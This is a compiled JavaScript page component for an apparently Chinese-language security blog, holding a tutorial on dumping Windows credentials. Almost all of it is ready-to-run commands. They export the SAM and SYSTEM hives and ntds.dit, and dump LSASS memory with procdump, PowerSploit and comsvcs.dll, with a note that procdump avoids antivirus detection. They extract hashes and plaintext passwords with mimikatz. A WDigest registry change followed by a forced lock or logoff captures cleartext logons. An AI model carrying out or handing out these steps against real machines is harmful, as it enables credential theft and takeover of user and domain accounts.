import{_ as n,W as i,X as l,Y as s,Z as d,a0 as r,a1 as e,C as t}from"./framework-b6a07282.js";const c="/assets/1-832be411.jpg",o={},u=e(`<h2 id="抓取windows密码" tabindex="-1"><a class="header-anchor" href="#抓取windows密码" aria-hidden="true">#</a> 抓取Windows密码</h2><h3 id="离线读取sam文件" tabindex="-1"><a class="header-anchor" href="#离线读取sam文件" aria-hidden="true">#</a> 离线读取SAM文件</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.导出sam文件和system文件
第一种方式：在cmd上执行以下命令：
reg save hklm<span class="token punctuation">\\</span>sam sam.hive
reg save hklm<span class="token punctuation">\\</span>system system.hive

第二种方式：通过nishang中的Copy-VSS进行复制，如果这个脚本运行在了DC服务器上，ntds.dit和SYSTEM hive也能被拷贝出来
首先上传copy-vss
然后执行
powershell
import-module .<span class="token punctuation">\\</span>copy-vss.ps1
copy-vss

<span class="token number">2</span>.通过mimikatz工具读取sam文件和system文件 <span class="token comment">#读取出来的是密文，hashcat或在线网站解密</span>
lsadump::sam /sam:sam.hive /system:system.hive
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="在线读取sam文件" tabindex="-1"><a class="header-anchor" href="#在线读取sam文件" aria-hidden="true">#</a> 在线读取SAM文件</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.使用mimikatz在线读取SAM文件 <span class="token comment">#密文</span>
mimikatz.exe <span class="token string">&quot;privilege::debug&quot;</span> <span class="token string">&quot;token::elevate&quot;</span> <span class="token string">&quot;lsadump::sam&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="离线读取lsass进程" tabindex="-1"><a class="header-anchor" href="#离线读取lsass进程" aria-hidden="true">#</a> 离线读取lsass进程</h3><h4 id="导出lsass-dmp文件" tabindex="-1"><a class="header-anchor" href="#导出lsass-dmp文件" aria-hidden="true">#</a> 导出lsass.dmp文件</h4><p>一、使用任务管理器导出lsass.dmp文件</p><img src="`+c+`"><p>二、使用procdump导出lsass.dmp文件</p><p>ProcDump 是一个命令行实用工具，其主要用途是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU 峰值和生成故障转储的应用程序。 ProcDump 还包括使用窗口挂起 (使用相同的窗口挂起定义，Windows任务管 理器使用) 、未经处理的异常监视，并且可以根据系统性能计数器的值生成转储。 它还可用作可在其他脚本中嵌入 的常规进程转储实用工具。因为是微软的所以一般不会被杀软杀掉</p><ol><li><p>首先将procdump.exe文件上传至目标服务器</p></li><li><p>然后执行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>procdump.exe ‐accepteula ‐ma lsass.exe lsass.dmp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li></ol><p>三、使用PowerSploit 的Out-MiniDump模块导出lsass.dmp</p>`,13),p={href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1",target:"_blank",rel:"noopener noreferrer"},m=e(`<ol><li><p>将Out-Minidump.ps1上传至目标服务器</p></li><li><p>执行</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>powershell
import-module .<span class="token punctuation">\\</span>out-minidump.ps1
get-process lsass <span class="token operator">|</span> out-minidump
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ol><p>四、使用comsvcs.dll的导出函数MiniDump实现导出lsass.dump</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1. 首先查看lsass.exe进程PID:
tasklist | findstr lsass.exe

2.使用powershell导出
rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 508 C:\\lsass.dmp full
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="读取lsass-dmp文件" tabindex="-1"><a class="header-anchor" href="#读取lsass-dmp文件" aria-hidden="true">#</a> 读取lsass.dmp文件</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>使用mimikatz读取lsass.dmp <span class="token comment">#有明文</span>
mimikatz.exe <span class="token string">&quot;sekurlsa::minidump c:\\lsass.dmp&quot;</span> <span class="token string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="token builtin class-name">exit</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="在线读取lsass进程" tabindex="-1"><a class="header-anchor" href="#在线读取lsass进程" aria-hidden="true">#</a> 在线读取lsass进程</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>privilege::debug
sekurlsa::msv 获取HASH <span class="token punctuation">(</span>LM,NTLM<span class="token punctuation">)</span>
sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码
sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码
sekurlsa::tspkg 通过tspkg读取明文密码
sekurlsa::livessp 通过livessp 读取明文密码
sekurlsa::ssp 通过ssp 读取明文密码
sekurlsa::logonPasswords 通过以上各种方法读取明文密码 <span class="token comment">#直接一把梭，有明文</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="windows-2012r2之后抓取密码的方式" tabindex="-1"><a class="header-anchor" href="#windows-2012r2之后抓取密码的方式" aria-hidden="true">#</a> Windows-2012R2之后抓取密码的方式</h3><ul><li>在Windows2012系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过修改注册表的方式 抓取明文，需要用户重新登录后才能成功抓取。</li></ul><h4 id="抓密码步骤" tabindex="-1"><a class="header-anchor" href="#抓密码步骤" aria-hidden="true">#</a> 抓密码步骤</h4><pre><code>##### 1. 修改注册表
</code></pre><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>reg <span class="token function">add</span> HKEY_LOCAL_MACHINE<span class="token punctuation">\\</span>SYSTEM<span class="token punctuation">\\</span>CurrentControlSet<span class="token punctuation">\\</span>Control<span class="token punctuation">\\</span>SecurityProviders<span class="token punctuation">\\</span>WDigest /v UseLogonCredential /t REG_DWORD /d <span class="token number">1</span> /f 开启
reg <span class="token function">add</span> HKEY_LOCAL_MACHINE<span class="token punctuation">\\</span>SYSTEM<span class="token punctuation">\\</span>CurrentControlSet<span class="token punctuation">\\</span>Control<span class="token punctuation">\\</span>SecurityProviders<span class="token punctuation">\\</span>WDigest /v UseLogonCredential /t REG_DWORD /d <span class="token number">0</span> /f 关闭
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="_2-锁屏" tabindex="-1"><a class="header-anchor" href="#_2-锁屏" aria-hidden="true">#</a> 2.锁屏</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.方式一
rundll32.exe user32.dll,LockWorkStation 锁屏

<span class="token number">2</span>.方式二
query user 查询登录
logoff ID 下载
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="_3-抓取密码" tabindex="-1"><a class="header-anchor" href="#_3-抓取密码" aria-hidden="true">#</a> 3.抓取密码</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sekurlsa::logonPasswords
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,16);function v(h,b){const a=t("ExternalLinkIcon");return i(),l("div",null,[u,s("ul",null,[s("li",null,[s("a",p,[d("https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1"),r(a)])])]),m])}const k=n(o,[["render",v],["__file","抓取Windows密码.html.vue"]]);export{k as default};
